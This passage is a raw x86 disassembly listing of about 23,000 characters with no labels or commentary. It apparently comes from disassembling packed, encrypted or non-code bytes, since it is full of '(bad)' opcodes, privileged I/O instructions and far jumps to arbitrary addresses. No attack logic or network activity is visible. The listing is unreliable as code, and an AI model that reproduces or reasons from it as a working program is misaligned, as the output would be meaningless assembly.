  4104c2:	jge    0x41045b
  4104c4:	div    DWORD PTR [edx-0x1d48f3cb]
  4104ca:	(bad)  
  4104cc:	push   cs
  4104cd:	jae    0x41048c
  4104cf:	ret    0x8007
  4104d2:	nop
  4104d3:	push   edx
  4104d4:	ins    BYTE PTR es:[edi],dx
  4104d5:	mov    al,0x88
  4104d7:	jb     0x4104ac
  4104d9:	jne    0x4104bc
  4104db:	push   edi
  4104dc:	ret    
  4104dd:	dec    ecx
  4104de:	retf   
  4104df:	and    edx,ecx
  4104e1:	retf   
  4104e2:	(bad)  
  4104e3:	cdq    
  4104e4:	stc    
  4104e5:	outs   dx,DWORD PTR ds:[esi]
  4104e6:	in     eax,dx
  4104e7:	out    dx,al
  4104e8:	jg     0x41050a
  4104ea:	pop    esp
  4104eb:	enter  0xea45,0x11
  4104ef:	sbb    edi,ebx
  4104f1:	mov    cl,0xc5
  4104f3:	sub    bh,BYTE PTR [ebx+0x7a6c5822]
  4104f9:	xor    ebp,DWORD PTR [esi-0x32dd0bfb]
  4104ff:	or     DWORD PTR [edi-0x4316ea8],ebx
  410505:	push   0x77
  410507:	mov    ah,0x28
  410509:	stos   DWORD PTR es:[edi],eax
  41050a:	mov    ?,WORD PTR [eax+edx*2+0x60]
  41050e:	rol    DWORD PTR [ebx],cl
  410510:	cmp    DWORD PTR [ebx-0x5e3c11be],0xffffff86
  410517:	push   esp
  410518:	or     ch,BYTE PTR [eiz*4-0x2d92bb17]
  41051f:	stos   BYTE PTR es:[edi],al
  410520:	fdiv   DWORD PTR ds:0xa16a64a2
  410526:	jg     0x410519
  410528:	dec    eax
  410529:	popf   
  41052a:	cmp    BYTE PTR [edx+0x6bcc9e2f],bl
  410530:	xchg   ebx,eax
  410531:	scas   al,BYTE PTR es:[edi]
  410532:	cld    
  410533:	shl    BYTE PTR [ebx+0x41],1
  410536:	and    DWORD PTR [edx+edx*4+0x31],0xffffff99
  41053b:	call   0x43fd:0xe492900a
  410542:	push   esp
  410543:	adc    ah,0xd0
  410546:	pop    ecx
  410547:	int    0xdb
  410549:	pop    edx
  41054a:	into   
  41054b:	cmp    al,0x1c
  41054d:	or     al,BYTE PTR [ebx+0x2cdd5f06]
  410553:	les    edi,FWORD PTR [eax+0x56]
  410556:	dec    ebp
  410557:	mov    ebx,0xf143705f
  41055c:	xchg   ecx,eax
  41055d:	scas   eax,DWORD PTR es:[edi]
  41055e:	lods   al,BYTE PTR ds:[si]
  410560:	push   esp
  410561:	jbe    0x410532
  410563:	dec    esp
  410564:	mov    ecx,0x65a49414
  410569:	sbb    BYTE PTR [edi-0x40fca1c2],0xf2
  410570:	xchg   edi,eax
  410571:	add    edx,DWORD PTR [edi+0x69]
  410574:	fldenv [ecx+0x63]
  410577:	outs   dx,DWORD PTR ds:[esi]
  410578:	dec    esi
  410579:	add    BYTE PTR [ebx+0x2a],bh
  41057c:	mov    ch,0x7d
  41057e:	adc    ch,BYTE PTR [esi+esi*1-0x4b]
  410582:	test   al,0xa5
  410584:	xchg   esp,eax
  410585:	and    ebx,DWORD PTR [edi+0x68]
  410588:	mov    ah,0x71
  41058a:	xchg   edx,eax
  41058b:	in     al,0x66
  41058d:	xor    ebx,0x690594cb
  410593:	pushf  
  410594:	xor    al,0x2b
  410596:	retf   0x810
  410599:	dec    esi
  41059a:	add    bh,BYTE PTR [edi-0x389da33f]
  4105a0:	push   esp
  4105a1:	arpl   bx,sp
  4105a3:	mov    cl,0x17
  4105a5:	or     eax,0x42920d85
  4105aa:	adc    eax,0xf7f8bcee
  4105af:	js     0x4105cd
  4105b1:	icebp  
  4105b2:	pop    es
  4105b3:	lods   al,BYTE PTR ds:[esi]
  4105b4:	mov    eax,ds:0x8b86d113
  4105b9:	xor    al,0x41
  4105bb:	inc    ecx
  4105bc:	call   0x7863:0xe6b2c401
  4105c3:	hlt    
  4105c4:	and    DWORD PTR [eax-0x3],ecx
  4105c7:	int3   
  4105c8:	xor    dh,BYTE PTR [edi+0x4cd32182]
  4105ce:	or     al,0xe2
  4105d0:	bound  edx,QWORD PTR [ebx+0x460c11c0]
  4105d6:	retf   
  4105d7:	xchg   DWORD PTR [ebx],edx
  4105d9:	iret   
  4105da:	mov    ch,0xe8
  4105dc:	dec    ebp
  4105dd:	inc    ecx
  4105de:	mov    eax,ds:0x7a5a985b
  4105e3:	test   eax,0x87528fc
  4105e8:	cmp    BYTE PTR [edi+0x51fddc4a],al
  4105ee:	and    esp,ebp
  4105f0:	ss stc 
  4105f2:	out    dx,eax
  4105f3:	jno    0x410606
  4105f5:	fsubr  DWORD PTR [ecx+0x20e4314a]
  4105fb:	rcl    DWORD PTR [edi+0x7012a3f4],cl
  410601:	sbb    al,0x97
  410603:	fdivp  st(0),st
  410605:	ret    0x9161
  410608:	fst    QWORD PTR [edi-0x89b2abe]
  41060e:	mov    edx,0xdc417de2
  410613:	mov    BYTE PTR [edx],dl
  410615:	mov    esp,0x6be78e46
  41061a:	jb     0x4105cb
  41061c:	popa   
  41061d:	dec    esp
  41061e:	out    dx,eax
  41061f:	imul   edx,DWORD PTR [ecx],0x210fb3dc
  410625:	sbb    dl,BYTE PTR [eax-0x2]
  410628:	xchg   DWORD PTR [ecx-0x2f],esp
  41062b:	(bad)  
  41062c:	in     al,dx
  41062d:	push   ebp
  41062e:	jecxz  0x41067d
  410630:	das    
  410631:	inc    esp
  410632:	xchg   ebp,eax
  410633:	xchg   ebx,edx
  410635:	mov    esi,0x42027db4
  41063a:	rcr    dl,1
  41063c:	(bad)  
  41063d:	sub    BYTE PTR [esi-0x7c],ch
  410640:	enter  0x8ea4,0xfb
  410644:	mov    ah,0xec
  410646:	and    al,BYTE PTR [edx+0x7bf8f558]
  41064c:	mov    esp,0xd6d30a54
  410651:	test   al,0x9a
  410653:	push   edx
  410654:	jge    0x4106b3
  410656:	retf   0x38f1
  410659:	adc    DWORD PTR [eax+0x52],0x3
  41065d:	push   esp
  41065e:	fadd   DWORD PTR [ebx-0x3d22d9bb]
  410664:	lahf   
  410665:	leave  
  410666:	jmp    0xed78:0x60fcfb4b
  41066d:	fucomp st(2)
  41066f:	neg    BYTE PTR [edx+ecx*8+0x6a069649]
  410676:	lods   al,BYTE PTR es:[esi]
  410678:	call   0x4245:0x432a852
  41067f:	mov    esi,0x61f8d51d
  410684:	pop    ds
  410685:	out    dx,al
  410686:	add    DWORD PTR [ebp-0x18],esi
  410689:	xchg   ebx,eax
  41068a:	lahf   
  41068b:	pop    eax
  41068c:	pop    esi
  41068d:	fsubp  st(2),st
  41068f:	xchg   esi,eax
  410690:	ja     0x4106ba
  410692:	out    dx,eax
  410693:	xlat   BYTE PTR ds:[ebx]
  410694:	test   BYTE PTR [ecx],ah
  410696:	cmp    DWORD PTR [edi],edx
  410698:	xchg   ebx,eax
  410699:	aas    
  41069a:	popf   
  41069b:	ins    DWORD PTR es:[edi],dx
  41069c:	adc    ebp,DWORD PTR [esi-0x4]
  41069f:	cdq    
  4106a0:	xchg   ecx,eax
  4106a1:	xchg   ebx,eax
  4106a2:	mov    esp,0x180f856
  4106a7:	sub    DWORD PTR [eax-0x2d9eba23],eax
  4106ad:	add    al,0x7e
  4106af:	test   DWORD PTR [esi+ebp*1+0x30],edi
  4106b3:	and    al,BYTE PTR ds:0x39d8713a
  4106b9:	mov    WORD PTR [ecx-0x13],cs
  4106bc:	push   ebp
  4106bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106be:	inc    eax
  4106bf:	lds    edx,FWORD PTR [edi+0x18]
  4106c2:	mov    BYTE PTR [edx],dh
  4106c4:	bound  ecx,QWORD PTR [ebx+0x72077288]
  4106ca:	mov    esp,gs
  4106cc:	mov    ecx,0x4be5bf8
  4106d1:	cmp    al,0x3c
  4106d3:	xchg   edx,eax
  4106d4:	push   ebp
  4106d5:	jno    0x4106e2
  4106d7:	bound  edi,QWORD PTR [eax+0xc]
  4106da:	addr16 addr16 push ss
  4106dd:	xchg   esi,eax
  4106de:	loop   0x41070b
  4106e0:	int    0xfe
  4106e2:	sti    
  4106e3:	or     DWORD PTR [edx+0x43],ebp
  4106e6:	jp     0x4106ca
  4106e8:	xor    al,0x87
  4106ea:	jmp    0xe2b98df8
  4106ef:	xor    ah,BYTE PTR [esi+esi*4]
  4106f2:	repnz fwait
  4106f4:	cmp    ecx,esp
  4106f6:	or     cl,BYTE PTR [ecx+edx*8-0x1b]
  4106fa:	jno    0x410724
  4106fc:	adc    edx,DWORD PTR [ebp-0x569f4390]
  410702:	popf   
  410703:	ja     0x4106fc
  410705:	add    al,0xa1
  410707:	adc    ebx,eax
  410709:	inc    edi
  41070a:	push   ebp
  41070b:	imul   eax,ecx,0x32
  41070e:	(bad)  
  41070f:	imul   esp,DWORD PTR [ebx-0x6724a33f],0x979bb925
  410719:	repnz mov dh,0x61
  41071c:	adc    cl,BYTE PTR [edi-0x22]
  41071f:	pop    ebx
  410720:	sub    DWORD PTR [ebx],0xfffffff6
  410723:	xlat   BYTE PTR ds:[ebx]
  410724:	adc    esp,DWORD PTR [ebx+ebp*2-0x58ecd9ea]
  41072b:	add    eax,0x594ef78c
  410730:	psubsw mm2,QWORD PTR [eax]
  410733:	add    BYTE PTR [eax+0x7],al
  410736:	(bad)  
  410737:	mov    al,0x8b
  410739:	adc    bl,BYTE PTR [edx+0x1d]
  41073c:	test   al,0xfa
  41073e:	les    edi,FWORD PTR [ebp+0x78]
  410741:	and    eax,0x1c52b73a
  410746:	out    dx,eax
  410747:	add    ebx,DWORD PTR [ecx+0x21]
  41074a:	push   ss
  41074b:	mov    edx,0x5a807fda
  410750:	mov    DWORD PTR [edi+0x31],ebp
  410753:	adc    eax,0xade78548
  410758:	test   eax,0xafec6c61
  41075d:	jge    0x410701
  41075f:	jno    0x410726
  410761:	js     0x410756
  410763:	pop    ecx
  410764:	adc    BYTE PTR ds:0x43bc87c,dl
  41076a:	pushf  
  41076b:	(bad)  
  41076d:	outs   dx,BYTE PTR ds:[esi]
  41076e:	add    BYTE PTR [ebx+0x5d405f5f],cl
  410774:	mov    ebx,0x74b9c615
  410779:	inc    esp
  41077a:	sub    BYTE PTR [ebp+0x34aca05b],dh
  410780:	mov    al,0x7a
  410782:	jl     0x410711
  410784:	out    0x23,al
  410786:	ret    0x9e37
  410789:	dec    edi
  41078a:	sub    bl,BYTE PTR [esi+0x71]
  41078d:	inc    ecx
  41078e:	add    esp,ecx
  410790:	push   0xda9fa47e
  410795:	or     eax,0xe579b76a
  41079a:	imul   ebx,DWORD PTR [esi+0x7020cd3d],0x61a3797f
  4107a4:	or     al,0x7
  4107a6:	in     al,dx
  4107a7:	jl     0x410777
  4107a9:	retf   0xc317
  4107ac:	outs   dx,BYTE PTR ds:[esi]
  4107ad:	adc    al,0x24
  4107af:	push   0xa5ad6c49
  4107b4:	inc    ebp
  4107b5:	and    eax,0x7ecf0bb9
  4107ba:	in     al,dx
  4107bb:	(bad)  [eax]
  4107bd:	es pusha 
  4107bf:	add    al,0x44
  4107c1:	jg     0x410765
  4107c3:	icebp  
  4107c4:	sub    eax,0x96a9585d
  4107c9:	sbb    DWORD PTR [esi+0x30],0xffffffbd
  4107cd:	cmp    ecx,DWORD PTR [eax+0x4a]
  4107d0:	and    BYTE PTR [ebx-0x48],dh
  4107d3:	lock inc esi
  4107d5:	mov    esi,0xc5f20304
  4107da:	loopne 0x410789
  4107dc:	popf   
  4107dd:	mov    ebp,0x498d8561
  4107e2:	pop    esp
  4107e3:	(bad)  
  4107e4:	mov    cl,bh
  4107e6:	lods   al,BYTE PTR ds:[esi]
  4107e7:	inc    edx
  4107e8:	xor    dh,BYTE PTR ds:0xe788ae88
  4107ee:	dec    ebp
  4107ef:	jecxz  0x4107cd
  4107f1:	in     eax,dx
  4107f2:	or     DWORD PTR [edi],ebp
  4107f4:	cmp    bh,BYTE PTR [edi-0x4bead8cc]
  4107fa:	mov    ch,bh
  4107fc:	fbstp  TBYTE PTR [ecx]
  4107fe:	loopne 0x41086e
  410800:	stos   BYTE PTR es:[edi],al
  410801:	stos   BYTE PTR es:[edi],al
  410802:	mov    edx,0xd405287a
  410807:	popa   
  410808:	dec    esi
  410809:	test   al,0x7f
  41080b:	aaa    
  41080c:	hlt    
  41080d:	mov    DWORD PTR [edx-0x31],edi
  410810:	sar    dl,1
  410812:	outs   dx,BYTE PTR ds:[esi]
  410813:	je     0x4107ea
  410815:	add    dh,al
  410817:	sub    BYTE PTR [eax],al
  410819:	adc    ch,BYTE PTR [bp-0x176e]
  41081e:	and    DWORD PTR [ecx-0x18],0xffffffa6
  410822:	and    al,0xbe
  410824:	idiv   BYTE PTR [ecx]
  410826:	das    
  410827:	js     0x410879
  410829:	mov    ds:0x97497b61,al
  41082e:	mov    ch,0x9e
  410830:	mov    esp,0x243101c2
  410835:	xor    cl,BYTE PTR ds:0x66f4a92e
  41083b:	daa    
  41083c:	icebp  
  41083d:	sti    
  41083e:	cmp    DWORD PTR [ebp-0x47],0xc94ca588
  410845:	hlt    
  410846:	sbb    bl,BYTE PTR [edx]
  410848:	jne    0x4107cf
  41084a:	lods   al,BYTE PTR ds:[esi]
  41084b:	adc    al,0x81
  41084d:	call   0x986d30ac
  410852:	scas   eax,DWORD PTR es:[edi]
  410853:	pusha  
  410854:	shl    DWORD PTR ss:[esi],cl
  410857:	lds    edx,FWORD PTR [edx]
  410859:	jp     0x410890
  41085b:	sub    eax,0xabf40677
  410860:	lahf   
  410861:	popf   
  410862:	call   0x994c5f6
  410867:	out    0x6d,al
  410869:	int3   
  41086a:	sub    BYTE PTR ds:0xfc8d92eb,ch
  410870:	pop    es
  410871:	mov    bh,0x6f
  410873:	gs mov ch,0xa3
  410876:	adc    eax,0xeb0647ab
  41087b:	pop    ebp
  41087c:	xchg   esi,eax
  41087d:	aam    0xa5
  41087f:	dec    edi
  410880:	sub    al,0x14
  410882:	and    cl,BYTE PTR [esi]
  410884:	sbb    edi,DWORD PTR [ebx+esi*4+0x40]
  410888:	push   eax
  410889:	pop    esp
  41088a:	cmp    edx,DWORD PTR [eax]
  41088c:	ffree  st(7)
  41088e:	mov    dh,0x31
  410890:	test   eax,0x905cdf17
  410895:	or     BYTE PTR [edi+0x25],cl
  410898:	arpl   WORD PTR [edi],dx
  41089a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089b:	xlat   BYTE PTR ds:[ebx]
  41089c:	pop    es
  41089d:	sub    DWORD PTR [ecx],esi
  41089f:	mov    bl,0xaa
  4108a1:	hlt    
  4108a2:	mov    eax,ds:0xafa93210
  4108a7:	lock sbb ebp,DWORD PTR [esi+0x28]
  4108ab:	add    ah,bl
  4108ad:	(bad)  
  4108ae:	and    edi,DWORD PTR [ebx+edx*4+0x62]
  4108b2:	sbb    eax,0x46e02a54
  4108b7:	bound  esi,QWORD PTR [edi-0x14]
  4108ba:	dec    esi
  4108bb:	aad    0x49
  4108bd:	fwait
  4108be:	es pop esi
  4108c0:	stos   DWORD PTR es:[edi],eax
  4108c1:	sbb    DWORD PTR ds:0xed5fa650,0x70b5f480
  4108cb:	jge    0x410917
  4108cd:	out    dx,eax
  4108ce:	dec    esp
  4108cf:	sbb    DWORD PTR ds:0xf1d559d3,edx
  4108d5:	dec    ebx
  4108d6:	xor    DWORD PTR [ebp-0x45],ebx
  4108d9:	mov    gs,WORD PTR [ecx+0x52]
  4108dc:	xlat   BYTE PTR ds:[ebx]
  4108dd:	push   0xffffff8a
  4108df:	call   0x227b4459
  4108e4:	mov    ?,WORD PTR [ebx-0x3d]
  4108e7:	cdq    
  4108e8:	jbe    0x410930
  4108ea:	push   edx
  4108eb:	or     eax,0xd60849cd
  4108f0:	dec    ebp
  4108f1:	sbb    edi,esp
  4108f3:	clc    
  4108f4:	and    edi,DWORD PTR [edx+eax*4-0x3e124ac8]
  4108fb:	and    DWORD PTR [esi],ecx
  4108fd:	lods   al,BYTE PTR ds:[esi]
  4108fe:	xchg   ecx,eax
  4108ff:	pop    esi
  410900:	sbb    DWORD PTR [edi],esp
  410902:	sbb    eax,ecx
  410904:	fld    st(4)
  410906:	retf   
  410907:	jmp    0xbdc4:0x84cd47dc
  41090e:	xchg   esi,esp
  410910:	sbb    edx,DWORD PTR [edx+0x60]
  410913:	cli    
  410914:	cmp    al,0xbc
  410916:	inc    ax
  410918:	mov    eax,0xeb810662
  41091d:	scas   eax,DWORD PTR es:[edi]
  41091e:	fsincos 
  410920:	push   esi
  410921:	(bad)  
  410922:	(bad)  
  410923:	fld    QWORD PTR [esi]
  410925:	daa    
  410926:	jl     0x41098b
  410928:	std    
  410929:	xchg   edx,eax
  41092a:	cdq    
  41092b:	xchg   ebp,eax
  41092c:	sbb    eax,DWORD PTR [ecx]
  41092e:	stos   DWORD PTR es:[edi],eax
  41092f:	sbb    edi,DWORD PTR [ecx]
  410931:	out    dx,al
  410932:	or     DWORD PTR [esi+0x2eb57c82],0x78d0cb84
  41093c:	icebp  
  41093d:	je     0x410917
  41093f:	imul   ebp,DWORD PTR [ecx],0x61
  410942:	push   esi
  410943:	stos   BYTE PTR es:[edi],al
  410944:	test   BYTE PTR [esi],bh
  410946:	lods   al,BYTE PTR ds:[esi]
  410947:	cmp    al,0x70
  410949:	mov    edi,0x1847d4b4
  41094e:	mov    ecx,0x642877ff
  410953:	push   0x62
  410955:	cmp    eax,0xb26798f2
  41095a:	jg     0x4109c6
  41095c:	pop    ebp
  41095d:	or     esi,ebx
  41095f:	xchg   ebp,eax
  410960:	retf   
  410961:	pushf  
  410962:	sbb    dl,BYTE PTR [ebp-0x198ef0a2]
  410968:	mov    dl,BYTE PTR [edi]
  41096a:	sbb    BYTE PTR [ebx+0x46d10ba6],0x51
  410971:	add    BYTE PTR [ebx],ah
  410973:	ja     0x410988
  410975:	out    0x73,eax
  410977:	repnz rcr BYTE PTR [ecx-0x5d0859e3],cl
  41097e:	popf   
  41097f:	outs   dx,BYTE PTR ds:[esi]
  410980:	jmp    0x4109f7
  410982:	xchg   ecx,eax
  410983:	cdq    
  410984:	imul   edx,DWORD PTR ds:0x9d606160,0x35
  41098b:	push   ebp
  41098c:	adc    al,dl
  41098e:	dec    edi
  41098f:	imul   BYTE PTR [eax]
  410991:	setge  BYTE PTR [edx+0x3c7fadef]
  410998:	pusha  
  410999:	add    ebx,ebx
  41099b:	cmp    DWORD PTR [ecx+ebp*8+0x1da4c9dc],eax
  4109a2:	fldenv [ecx]
  4109a4:	sub    DWORD PTR [ebx],esi
  4109a6:	imul   ecx,DWORD PTR [edx+0xb]
  4109aa:	xchg   edx,eax
  4109ab:	add    edi,DWORD PTR [edx-0x6d]
  4109ae:	jl     0x410a21
  4109b0:	stos   DWORD PTR es:[edi],eax
  4109b1:	sahf   
  4109b2:	mov    al,0x6f
  4109b4:	ins    WORD PTR es:[edi],dx
  4109b6:	push   0x60151ed8
  4109bb:	outs   dx,BYTE PTR ds:[esi]
  4109bc:	aaa    
  4109bd:	cmp    DWORD PTR [edi+ebp*1],esi
  4109c0:	fcmovnu st,st(6)
  4109c2:	fst    QWORD PTR [ecx+0x1f558ca2]
  4109c8:	pop    ecx
  4109c9:	push   esp
  4109ca:	cmp    DWORD PTR [esi],0xb8a1e2b4
  4109d0:	mov    ebx,DWORD PTR [eax+0x52]
  4109d3:	fistp  DWORD PTR [edi+0x54d6605e]
  4109da:	jb     0xcf6f7f18
  4109e0:	mov    al,ds:0x2da7d169
  4109e5:	out    0xa5,al
  4109e7:	inc    eax
  4109e8:	sub    edx,0xffffffdd
  4109eb:	adc    DWORD PTR [edx+0x5417ce1e],ebx
  4109f1:	aas    
  4109f2:	push   ss
  4109f3:	(bad)  
  4109f4:	xchg   edx,eax
  4109f5:	rol    DWORD PTR [edi+0x17],1
  4109f8:	jle    0x410a5a
  4109fa:	ins    DWORD PTR es:[edi],dx
  4109fb:	pop    es
  4109fc:	mov    bl,0xe3
  4109fe:	into   
  4109ff:	inc    esp
  410a00:	loope  0x410a00
  410a02:	in     al,dx
  410a03:	jge    0x410a78
  410a05:	loop   0x410a18
  410a07:	ins    DWORD PTR es:[edi],dx
  410a08:	xchg   esp,eax
  410a09:	ins    BYTE PTR es:[edi],dx
  410a0a:	mov    edx,0xe6f7bb42
  410a0f:	mov    esi,0x17c9c0d2
  410a14:	enter  0x551c,0x8
  410a18:	mov    ds:0x2f9b8b7e,al
  410a1d:	jo     0x4109d2
  410a1f:	outs   dx,DWORD PTR ds:[esi]
  410a20:	dec    esp
  410a21:	lahf   
  410a22:	pop    esp
  410a23:	ficomp DWORD PTR [edi+0xc]
  410a26:	pop    esi
  410a27:	pop    ebx
  410a28:	xor    bh,BYTE PTR [edi-0x5d3f3457]
  410a2e:	or     al,0x30
  410a30:	sbb    bl,BYTE PTR [ecx+0x6f]
  410a33:	push   0x11faace8
  410a38:	shl    ebp,1
  410a3a:	js     0x410a9b
  410a3c:	stos   BYTE PTR es:[edi],al
  410a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3e:	out    dx,eax
  410a3f:	and    bh,BYTE PTR ds:0x9844c0c4
  410a45:	jg     0x410a9f
  410a47:	retf   0xe8d1
  410a4a:	lea    edx,[ecx]
  410a4c:	and    BYTE PTR [edx+0x3d],bh
  410a4f:	es jno 0x410a32
  410a52:	inc    esi
  410a53:	cmp    ah,BYTE PTR [ebp-0x53]
  410a56:	arpl   bp,si
  410a58:	xor    dl,0x8c
  410a5b:	xor    BYTE PTR [ebp-0x74d672cb],0x89
  410a62:	ins    DWORD PTR es:[edi],dx
  410a63:	imul   esp,DWORD PTR [ecx+0x4eb93d97],0xc657e51
  410a6d:	sbb    BYTE PTR [edx-0x68331f15],dh
  410a73:	xchg   edx,eax
  410a74:	mov    DWORD PTR [bp+di],0xe7e8b21c
  410a7b:	mov    bh,0x70
  410a7d:	sti    
  410a7e:	mov    bl,ch
  410a80:	mov    BYTE PTR [ebp+eax*1+0x62884756],al
  410a87:	(bad)  
  410a88:	sbb    dh,dl
  410a8a:	add    ebp,ebx
  410a8c:	in     eax,dx
  410a8d:	sub    al,0xc8
  410a8f:	test   al,0x58
  410a91:	in     al,dx
  410a92:	(bad)  
  410a94:	in     eax,dx
  410a95:	mov    bl,0x91
  410a97:	fsub   st,st(0)
  410a99:	sahf   
  410a9a:	jl     0x410ad5
  410a9c:	ins    BYTE PTR es:[edi],dx
  410a9d:	rcl    DWORD PTR [esp+ebp*2],1
  410aa0:	pop    edx
  410aa1:	push   cs
  410aa2:	fdivp  st(0),st
  410aa4:	fdivp  st(3),st
  410aa6:	push   es
  410aa7:	int    0x9
  410aa9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410aaa:	iret   
  410aab:	dec    esi
  410aac:	aas    
  410aad:	shl    BYTE PTR [esi],1
  410aaf:	mov    al,ds:0x4bcba492
  410ab4:	mov    BYTE PTR [ecx],ch
  410ab6:	dec    esp
  410ab7:	(bad)  
  410ab8:	xchg   esi,eax
  410ab9:	push   ebx
  410aba:	mov    bh,0x87
  410abc:	popf   
  410abd:	and    al,bl
  410abf:	fstp   TBYTE PTR [ebp+0x4b]
  410ac2:	in     eax,dx
  410ac3:	stos   BYTE PTR es:[edi],al
  410ac4:	retf   0x3824
  410ac7:	cmp    ch,BYTE PTR [edx+0x1b]
  410aca:	inc    edi
  410acb:	dec    eax
  410acc:	test   ecx,esp
  410ace:	rcl    DWORD PTR [eax+0x25],1
  410ad1:	cs loop 0x410b18
  410ad4:	lahf   
  410ad5:	(bad)  
  410ad6:	fild   DWORD PTR [edi]
  410ad8:	das    
  410ad9:	loop   0x410ad5
  410adb:	test   eax,0xa4dde93a
  410ae0:	out    dx,al
  410ae1:	mov    cl,0xa8
  410ae3:	jle    0x410ac2
  410ae5:	xchg   ebp,eax
  410ae6:	inc    edx
  410ae7:	test   BYTE PTR [edi-0x56],bh
  410aea:	(bad)
  410aed:	enter  0x7eef,0x20
  410af1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410af2:	adc    ch,BYTE PTR [esi]
  410af4:	mov    bl,0x9a
  410af6:	sub    BYTE PTR [ebx],cl
  410af8:	jne    0x410aac
  410afa:	cwde   
  410afb:	mov    cl,0x29
  410afd:	icebp  
  410afe:	cld    
  410aff:	jl     0x410ad4
  410b01:	loop   0x410a96
  410b03:	inc    BYTE PTR [esi]
  410b05:	bnd jo 0x410a97
  410b08:	mov    ds:0x4a7e0a3e,al
  410b0d:	jl     0x410b16
  410b0f:	mov    dl,0xa5
  410b11:	adc    bl,BYTE PTR [edx-0x1f]
  410b14:	pop    ss
  410b15:	jmp    0x64e9880c
  410b1a:	stos   BYTE PTR es:[edi],al
  410b1b:	aad    0xec
  410b1d:	in     al,0xb6
  410b1f:	and    eax,0x9144b869
  410b24:	shl    BYTE PTR [eax-0x59],cl
  410b27:	sbb    BYTE PTR [esi-0x79],ah
  410b2a:	cmp    dh,al
  410b2c:	lock cli 
  410b2e:	adc    eax,0x8f826f22
  410b33:	jl     0x410b8b
  410b35:	pop    edx
  410b36:	mov    ecx,0x24b2996
  410b3b:	in     al,0x5b
  410b3d:	xchg   ebx,eax
  410b3e:	js     0x410b91
  410b40:	jb     0x410bbb
  410b42:	mov    dl,0xdf
  410b44:	ficom  WORD PTR [ebp+0x5a]
  410b47:	popf   
  410b48:	aam    0xb0
  410b4a:	lock xor al,0x9c
  410b4d:	cmp    esp,DWORD PTR [ecx-0x35]
  410b50:	icebp  
  410b51:	fimul  DWORD PTR [ecx-0x1]
  410b54:	shl    DWORD PTR [esi-0x68],1
  410b57:	push   edi
  410b58:	je     0x410b35
  410b5a:	push   eax
  410b5b:	adc    DWORD PTR [edx-0x59],ebp
  410b5e:	retf   
  410b5f:	add    eax,0x3063e64d
  410b64:	jns    0x410bb6
  410b66:	inc    esp
  410b67:	popa   
  410b68:	aaa    
  410b69:	mov    bl,0x8b
  410b6b:	ret    0xdebe
  410b6e:	jmp    0x36e0:0x87f9dc3d
  410b75:	jbe    0x410b3f
  410b77:	into   
  410b78:	out    dx,eax
  410b79:	fild   WORD PTR [edx]
  410b7b:	xchg   esp,eax
  410b7c:	push   ebx
  410b7d:	lahf   
  410b7e:	cmp    BYTE PTR [edi+eiz*8],bh
  410b81:	pop    edx
  410b82:	inc    ebp
  410b83:	and    DWORD PTR [ebx],ecx
  410b85:	aaa    
  410b86:	outs   dx,DWORD PTR ds:[esi]
  410b87:	ja     0x410bf3
  410b89:	loop   0x410b83
  410b8b:	mov    al,ds:0xe146a181
  410b90:	sbb    ebx,edx
  410b92:	fsub   QWORD PTR [edx+0x17]
  410b95:	test   DWORD PTR [edx-0x2fe0d4f0],esp
  410b9b:	mov    edi,0x2a3340a8
  410ba0:	lods   al,BYTE PTR ds:[esi]
  410ba1:	and    DWORD PTR [ebx],edi
  410ba3:	ror    DWORD PTR [edi*1-0x58977ec1],0x90
  410bab:	jle    0x410b4b
  410bad:	aam    0x24
  410baf:	cmc    
  410bb0:	adc    bl,BYTE PTR [edx+0x5b]
  410bb3:	fsub   QWORD PTR [edi-0x44d82fe9]
  410bb9:	and    al,0xff
  410bbb:	adc    DWORD PTR [ebp-0x80],0x5ea15986
  410bc2:	mov    ebx,0x6ad4b7a
  410bc7:	mov    edi,ecx
  410bc9:	adc    DWORD PTR [ebx+0x490e16ab],esi
  410bcf:	mov    ds:0xeeac9de1,al
  410bd4:	loopne 0x410b95
  410bd6:	pop    esi
  410bd7:	and    ebp,DWORD PTR [esi]
  410bd9:	ret    
  410bda:	repz mov gs,WORD PTR [edi]
  410bdd:	es push ds
  410bdf:	sti    
  410be0:	jb     0x410c43
  410be2:	ins    BYTE PTR es:[edi],dx
  410be3:	xor    BYTE PTR [ecx-0x76],cl
  410be6:	cmp    ch,BYTE PTR [ebx]
  410be8:	fist   DWORD PTR [edx+0x39]
  410beb:	repnz lods al,BYTE PTR ds:[esi]
  410bed:	(bad)  
  410bf1:	(bad)  
  410bf2:	imul   edx,DWORD PTR [edx],0x2b
  410bf5:	loopne 0x410b90
  410bf7:	mov    dh,0x65
  410bf9:	rcr    DWORD PTR [esi-0x9f904b0],0x1f
  410c00:	push   ebx
  410c01:	repz cli 
  410c03:	mov    ecx,0x2123cc8b
  410c08:	adc    cl,0x1d
  410c0b:	int3   
  410c0c:	(bad)  
  410c0d:	stos   BYTE PTR es:[edi],al
  410c0e:	out    0x8f,eax
  410c10:	imul   edx,DWORD PTR [ebp-0x5bc79d1e],0x31
  410c17:	mov    DWORD PTR [eax],edx
  410c19:	mov    esi,0x335ccf4e
  410c1e:	icebp  
  410c1f:	dec    ebx
  410c20:	fidiv  DWORD PTR [eax]
  410c22:	xor    ebx,ebp
  410c24:	jo     0x410bd0
  410c26:	push   ecx
  410c28:	call   0x2599:0xae32a843
  410c2f:	and    BYTE PTR [edx+0x7b],cl
  410c32:	ins    DWORD PTR es:[edi],dx
  410c33:	xor    BYTE PTR [ecx],bl
  410c35:	jb     0x410c8c
  410c37:	pop    esi
  410c38:	xchg   ecx,eax
  410c39:	and    eax,0x37086f66
  410c3e:	int    0xcd
  410c40:	or     al,0x2a
  410c42:	mov    ds:0xfceef92,eax
  410c47:	sub    DWORD PTR [ecx],ecx
  410c49:	stos   DWORD PTR es:[edi],eax
  410c4a:	call   0x6f6e:0x2933434e
  410c51:	mov    edi,0x8d5a45f9
  410c56:	lods   eax,DWORD PTR ds:[esi]
  410c57:	mov    ds:0x49482429,eax
  410c5c:	jmp    0x410cc7
  410c5e:	inc    esi
  410c5f:	jmp    0x979b:0xffb2fae8
  410c66:	inc    edi
  410c67:	sbb    al,0x10
  410c69:	xor    DWORD PTR [ebx-0x44],eax
  410c6c:	stos   BYTE PTR es:[edi],al
  410c6d:	xchg   esp,eax
  410c6e:	pop    esi
